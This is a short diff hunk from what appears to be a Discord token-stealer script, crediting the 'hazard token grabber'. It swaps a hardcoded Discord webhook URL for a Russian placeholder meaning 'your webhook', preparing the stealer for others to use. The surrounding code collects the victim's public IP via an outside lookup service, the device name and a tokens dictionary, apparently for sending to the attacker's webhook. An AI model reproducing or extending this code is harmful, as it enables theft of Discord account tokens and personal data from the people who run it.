@@ -16,7 +16,8 @@ from asyncdiscord import DiscordWebhook, DiscordEmbed, DiscordColor
 
 # credit to hazard token grabber by Rdimo (token check, decrypt, find_tokens)
 def start():
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1070298825765421096/ENNVduusrnQM3k5ik6QDZKxrjcfBmwrHEzXe3rNC58GPPuowIyS2zZjKblEoyPxb371Z"
+    WEBHOOK_URL = "Твой вебхук"
+    
     ip = requests.get("https://api.ipify.org").text
     device_name = platform.node()
     tokens: dict = {}
